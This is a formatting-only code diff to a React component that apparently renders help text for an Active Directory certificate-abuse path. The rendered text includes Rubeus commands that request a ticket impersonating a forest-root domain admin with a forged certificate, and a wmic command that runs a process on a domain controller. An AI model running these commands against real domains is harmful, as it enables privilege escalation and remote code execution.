@@ -14,8 +14,8 @@
 //
 // SPDX-License-Identifier: Apache-2.0
 
-import {FC} from 'react';
-import {Typography} from '@mui/material';
+import { FC } from 'react';
+import { Typography } from '@mui/material';
 
 const WindowsAbuse: FC = () => {
     return (
@@ -48,36 +48,24 @@ const WindowsAbuse: FC = () => {
             <Typography variant='body2'>
                 <b>Step 3</b>: Optionally purge all kerberos tickets from memory:
             </Typography>
-            <Typography component={'pre'}>
-                {
-                    "klist purge"
-                }
-            </Typography>
+            <Typography component={'pre'}>{'klist purge'}</Typography>
             <Typography variant='body2'>
                 <b>Step 4</b>: Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target
                 identity to impersonate and the PFX-formatted certificate created in Step 2:
             </Typography>
             <Typography component={'pre'}>
-                {
-                    "Rubeus asktgt /user:\"forestroot\\forestrootda\" /certificate:cert.pfx /password:asdf /ptt"
-                }
+                {'Rubeus asktgt /user:"forestroot\\forestrootda" /certificate:cert.pfx /password:asdf /ptt'}
             </Typography>
             <Typography variant='body2'>
                 <b>Step 5</b>: Optionally verify the TGT by listing it with the klist command:
             </Typography>
-            <Typography component={'pre'}>
-                {
-                    "klist"
-                }
-            </Typography>
+            <Typography component={'pre'}>{'klist'}</Typography>
             <Typography variant='body2'>
                 <b>Step 6</b>: Verify successful impersonation of the target identity by running the following WMIC
                 command:
             </Typography>
             <Typography component={'pre'}>
-                {
-                    "wmic /authority:\"kerberos:forestroot\\rootdomaindc\" /node:10.10.0.4 process call create \"whoami\""
-                }
+                {'wmic /authority:"kerberos:forestroot\\rootdomaindc" /node:10.10.0.4 process call create "whoami"'}
             </Typography>
         </>
     );
